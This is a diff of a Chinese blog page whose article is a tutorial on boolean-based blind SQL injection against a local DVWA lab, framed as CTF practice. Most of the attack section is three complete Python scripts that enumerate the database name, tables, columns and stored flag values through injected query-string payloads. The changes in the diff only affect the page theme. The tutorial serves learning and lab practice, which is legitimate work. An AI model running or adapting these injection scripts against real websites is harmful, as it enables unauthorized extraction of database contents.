@@ -1,66 +1,125 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>以dvwa为例学习简单sql布尔盲注的详细脚本 | Lethe | 忘川</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe's Blog">
-  <meta name="description" content="Lethe's Blog">
-  <script id="hexo-configurations">
-  var CONFIG = {
-    root: '/',
-    theme: 'lx',
-    version: '1.4.5',
-    localsearch:{
-      "enable": false,
-      "trigger": "auto",
-      "top_n_per_article": 1,
-      "unescape": false,
-      "preload": false
-      },
-    path: '-'
-  };
-</script>
+<html lang="">
 
-  <link rel="shortcut icon" href="/hacker.png">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.min.js"></script>
-  <script src="/js/jquery.jside.menu.js"></script>
-	<script>
-	$(document).ready(function(){
-	$(".menu-container").jSideMenu({
-	    jSidePosition: "position-right",
-	    jSideSticky: true,
-	    jSideSkin: "moonlit",
-	     });
-	}); 
-	</script>
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>以dvwa为例学习简单sql布尔盲注的详细脚本 ~ Lethe | 忘川</title>
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+  <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
   
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
 </head>
+
+
 <body>
-<div class="single">
-<div id="page">
-<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
-  <div class="overlay">
-  <div class="page-title">
-    <div class="avatar"><a href="/"><img src="/images/2.jpg"></a></div>
-    <span>2019-03-02</span>
-    <h2>以dvwa为例学习简单sql布尔盲注的详细脚本</h2>
-    <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/CTF/">CTF</a></div>
-    <div class="social-links">
-<a href="https://github.com/LetheSec" target="_blank"><i class="fa fa-github fa-fw"></i></a><a href="mailto:1013579926@qq.com"><i class="fa fa-envelope fa-fw"></i></a>
-</div></div>
-</div>
-</div>
-<div id="lx-main-content">
-  <div class="lx-post">
-    <div class="lx-entry padding">
-      <div>
-        <h2><span id="0x01-前置知识">0x01 前置知识</span></h2><p><br></p>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              <p class="mt-3">Saturday, March 2nd 2019, 6:55 pm</p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto">
+          <div class="markdown-body">
+            <h2><span id="0x01-前置知识">0x01 前置知识</span></h2><p><br></p>
 <h4><span id="1sql注入与sql盲注">1.SQL注入与SQL盲注</span></h4><p><strong>SQL注入：</strong></p>
 <ul>
 <li>执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</li>
@@ -89,7 +148,7 @@
 <h4><span id="4requests库的使用">4.Requests库的使用</span></h4><p>在CTF中里，python脚本中最基本的就是requests库的使用，本文不过多介绍其使用方法，可参考以下官方文档，讲的很详细：<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">快速上手——requests</a>以及<a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced" target="_blank" rel="noopener">高级用法——request</a></p>
 <p><br></p>
 <h2><span id="0x02-前置工作">0x02 前置工作</span></h2><p><br></p>
-<p>1.为了更贴近CTF比赛的模式，因此在dvwa的数据库中加入了flag，最终脚本的结果也是爆出flag<br>2.加了两个flag是为了更好体现脚本的功能<br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141221969.png" alt="dvwa库中的表"><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141308470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>1.为了更贴近CTF比赛的模式，因此在dvwa的数据库中加入了flag，最终脚本的结果也是爆出flag<br>2.加了两个flag是为了更好体现脚本的功能<br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141221969.png" srcset="/img/loading.gif" alt="dvwa库中的表"><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141308470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h2><span id="0x03-low-sql-injection-blind">0x03 Low SQL Injection (Blind)</span></h2><p><br></p>
 <h4><span id="1测试分析">1.测试分析</span></h4><p>经过简单的测试之后发现，页面只会出现两种回显，即</p>
@@ -143,102 +202,204 @@
 <p><br></p>
 <h4><span id="2脚本编写">2.脚本编写</span></h4><p>脚本中所用到的SQL语句与dvwa前面非盲注时语句差不多，可参考：<a href="https://blog.csdn.net/qq_42181428/article/details/87892132" target="_blank" rel="noopener">dvwa之SQL注入（1）</a></p>
 <p><strong>（1）脚本一：爆库名、表个数、表名</strong><br>我这里写的脚本是将当前数据库的所有表名都跑出来，实际在CTF比赛中，为节约时间可以不必这么做，因为一般包含flag的表名都会有特殊含义，只需要知道包含flag的表名即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本里用到的参数</span></span><br><span class="line"><span class="comment"># databaseLen   库名长度</span></span><br><span class="line"><span class="comment"># databse_name  库名</span></span><br><span class="line"><span class="comment"># tableNum      表的数量</span></span><br><span class="line"><span class="comment"># tableLen      表名长度</span></span><br><span class="line"><span class="comment"># table_name    表名</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span> </span><br><span class="line"><span class="comment"># 这里为节约时间只包含小写字母与数字，实际可能还有大写字母与符号</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">'?id=1\' and length(database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="comment"># 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database_lenth: '</span>+str(databaseLen))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">databse_name = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">'?id=1\' and substr(database(),'</span>+str(j)+<span class="string">',1)=\''</span>+str(i)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">'database_name: '</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 3.爆破表的个数</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">'?id=1\' and (select count(table_name) from information_schema.tables where table_schema=database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'tableNum: '</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出所有的表名</span></span><br><span class="line"><span class="comment"># (1)爆出各个表名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">'?id=1\' and length(substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">                <span class="comment"># 用法substr('This is a test', 6) 返回'is a test'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    table_payload = <span class="string">'?id=1\' and substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+table_name)</span><br></pre></td></tr></table></figure></p>
-<p><strong>脚本一的运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171115839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script1"></p>
+<p><strong>脚本一的运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171115839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script1"></p>
 <p><strong>（2）脚本二：爆列名</strong><br>由脚本一得到的结果，很显然flag应该在‘flagishere’表中，因此脚本二只是针对此表来跑出其中所有的列名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.判断flgishere表中字段数目</span></span><br><span class="line">columnNum = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    columnNum_payload = <span class="string">'?id=1\' and (select count(column_name) from information_schema.columns where table_name=\'flagishere\')='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnNum_payload, headers=headers).text:</span><br><span class="line">        columnNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'columnNum: '</span>+str(columnNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆出每个字段名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,columnNum):</span><br><span class="line">    column_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        columnLen_payload = <span class="string">'?id=1\' and length(substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnLen_payload, headers=headers).text:</span><br><span class="line">            columnLen = i</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(columnLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    column_payload = <span class="string">'?id=1\' and substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+column_payload, headers=headers).text:</span><br><span class="line">                        column_name += n</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+column_name)</span><br></pre></td></tr></table></figure></p>
-<p><strong>脚本二运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171725965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script2"></p>
+<p><strong>脚本二运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171725965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script2"></p>
 <p><strong>（3）脚本三：爆字段内容</strong><br>由脚本二的结果得知，真正的flag应该在’flagishere’表中的’flag’列下，所有脚本三就跑出该列下每条记录的值，也就是最终的flag(这里为了展示脚本可以爆多条记录的功能，所以自己设置了两个flag)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段名为'flag'</span></span><br><span class="line"><span class="comment"># 所以此脚本用来爆破flag字段中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890\&#123;\&#125;'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断flag字段中记录(行)数量</span></span><br><span class="line">rowNum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    rowNum_payload = <span class="string">'?id=1\' and (select count(*) from flagishere)='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowNum_payload, headers=headers).text:</span><br><span class="line">        rowNum = j</span><br><span class="line">print(<span class="string">"row_number: "</span>+str(rowNum))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,rowNum+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    rowContent = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">       <span class="comment">#rowLen_payload = '?id=1\' and length(substr(select flag from flagishere limit '+str(j)+',1),1)='+str(i)+' %23&amp;Submit=Submit#'</span></span><br><span class="line">        rowLen_payload = <span class="string">'?id=1\' and length(substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowLen_payload, headers=headers).text:    </span><br><span class="line">            rowLen = i</span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(rowLen))</span><br><span class="line">            <span class="comment">#爆出个字段内容</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,rowLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    rowContent_payload = <span class="string">'?id=1\' and substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowContent_payload, headers=headers).text:</span><br><span class="line">                        rowContent += n  </span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_content: '</span>+rowContent)</span><br></pre></td></tr></table></figure></p>
-<p><strong>脚本三运行结果如下:</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302172239513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script3"></p>
+<p><strong>脚本三运行结果如下:</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302172239513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script3"></p>
 <p><br></p>
 <h1><span id="0x04-总结">0x04 总结</span></h1><p>由于是刚入门的小白，各方面都在起步之中，还有许多需要继续努学习的，尤其要提高自己的代码编写能力，关于sql注入的学习也还会继续。</p>
 
+            <hr>
+          </div>
+          <br>
+          <div>
+            
+              <p>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/CTF">CTF</a>
+                  &nbsp;
+                
+              </p>
+            
+            <p>
+              <i class="iconfont icon-tag"></i>
+              
+                <a class="hover-with-bg" href="/tags/CTF">CTF</a>
+              
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      <div class="disqus" style="width:100%">
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_shortname = 'Lethe';
+    var disqus_config = function () {
+      this.page.url = 'https://lethe.site/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/';
+      this.page.identifier = '/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+      powered by Disqus.</a></noscript>
+</div>
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
